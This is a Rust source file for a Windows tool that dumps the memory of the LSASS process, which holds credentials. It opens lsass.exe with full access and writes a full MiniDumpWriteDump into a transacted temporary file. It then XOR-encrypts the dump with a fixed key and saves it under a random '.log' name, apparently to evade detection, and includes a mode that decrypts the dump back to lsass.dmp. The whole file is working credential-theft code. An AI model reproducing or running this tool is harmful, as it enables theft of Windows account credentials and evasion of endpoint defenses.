use core::slice;
use std::error::Error;
use std::fs::File;
use std::io::{Read, Write};
use std::path::PathBuf;
use std::ptr;

use rand::distributions::Alphanumeric;
use rand::prelude::*;

use sysinfo::System;

use windows::core::PCWSTR;
use windows::Win32::Storage::FileSystem::*;
use windows::Win32::System::Diagnostics::Debug::*;
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;

const LSASS: &str = "lsass.exe";
const KEY: &[u8] = b"DEADBEEF";

/// Implement the main logic of the program
pub fn run(action: &str) -> Result<(), Box<dyn Error>> {
    match action {
        "dump" => dump()?,
        _ => decrypt(action)?,
    }

    Ok(())
}

/// Print usage information
pub fn usage(prog: &str) {
    println!("Usage:");
    println!(".\\{prog} [dump | file_to_decrypt.log]");
    println!("\nExamples:");
    println!(".\\{prog}");
    println!(".\\{prog} 29ABE9Hy.log");
}

/// Dump LSASS memory to output file
fn dump() -> Result<(), Box<dyn Error>> {
    // Create output file
    let filename = format!(".\\{}.log", rand_str(8));
    println!("[*] Trying to dump to output file: {filename}");
    let path = PathBuf::from(filename);
    let mut out_file = File::create_new(path)?;
    println!("[+] Successfully created output file");

    // Get LSASS pid
    let pid = lsass_pid()?;
    println!("[+] Found {LSASS} pid: {pid}");

    // Open LSASS process
    let proc_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, false, pid)? };
    println!("[+] Successfully opened {LSASS} handle: {proc_handle:?}");

    // Create NTFS transaction object (TxF API)
    let txf_obj = unsafe {
        CreateTransaction(
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            0,
            0,
            INFINITE,
            PCWSTR(ptr::null_mut()),
        )?
    };

    // Create intermediate output file as a transacted operation
    let filename = format!(".\\{}.log", rand_str(8));
    let txf_file = filename.as_ptr() as *mut u16;
    let txf_handle = unsafe {
        CreateFileTransactedW(
            PCWSTR(txf_file),
            FILE_GENERIC_READ.0 | FILE_GENERIC_WRITE.0,
            FILE_SHARE_WRITE,
            None,
            CREATE_NEW,
            FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
            None,
            txf_obj,
            Some(std::mem::transmute(&TXFS_MINIVERSION_DIRTY_VIEW)),
            None,
        )?
    };

    // Dump LSASS memory to intermediate output file
    unsafe {
        MiniDumpWriteDump(
            proc_handle,
            pid,
            txf_handle,
            MiniDumpWithFullMemory,
            None,
            None,
            None,
        )?;
        //CloseHandle(proc_handle)?;
    }
    println!("[+] Dump successful!");

    // Encrypt dump and write to output file
    println!("[*] Encrypting and writing it to disk");
    let dump_size = unsafe { GetFileSize(txf_handle, None) } as usize;
    let map_handle = unsafe { CreateFileMappingW(txf_handle, None, PAGE_READONLY, 0, 0, None)? };
    let ptr = unsafe { MapViewOfFile(map_handle, FILE_MAP_READ, 0, 0, 0).Value as *mut u8 };
    let data = unsafe { slice::from_raw_parts_mut(ptr, dump_size) };

    println!("AAA {} {}", data.len(), dump_size);

    // let mut tmp: Vec<u8> = vec![1, 2, 3, 4, 5, 6, 7, 8];
    // let data = &mut tmp[..];

    let mut tmp = vec![0u8; dump_size];
    tmp.clone_from_slice(data);

    xor(&mut tmp, KEY);

    let count = out_file.write(&tmp)?;

    println!("AAA {count}");
    println!("[+] Done!");

    // CloseHandle...s

    Ok(())
}

/// Get LSASS pid
fn lsass_pid() -> Result<u32, Box<dyn Error>> {
    // Load system information
    let mut sys = System::new_all();
    sys.refresh_all();

    // Find LSASS process
    let proc = sys
        .processes_by_exact_name(LSASS)
        .next()
        .ok_or("Process not found")?;

    // Return pid
    Ok(proc.pid().as_u32())
}

/// Get a random string
fn rand_str(size: usize) -> String {
    thread_rng()
        .sample_iter(&Alphanumeric)
        .take(size)
        .map(char::from)
        .collect()
}

/// XOR a byte buffer with a key in place
pub fn xor(data: &mut [u8], key: &[u8]) {
    data.iter_mut()
        .zip(key.iter().cycle())
        .for_each(|(byte, key_byte)| *byte ^= key_byte);
}

/// Decrypt an encrypted dump
fn decrypt(path: &str) -> Result<(), Box<dyn Error>> {
    let mut file = File::open(path)?;

    let mut buf = Vec::<u8>::new();
    file.read_to_end(&mut buf)?;

    xor(buf.as_mut_slice(), KEY);

    let mut out_file = File::create_new("lsass.dmp")?;
    let _count = out_file.write(&buf)?;
    println!("[+] Successfully created output file");

    Ok(())
}
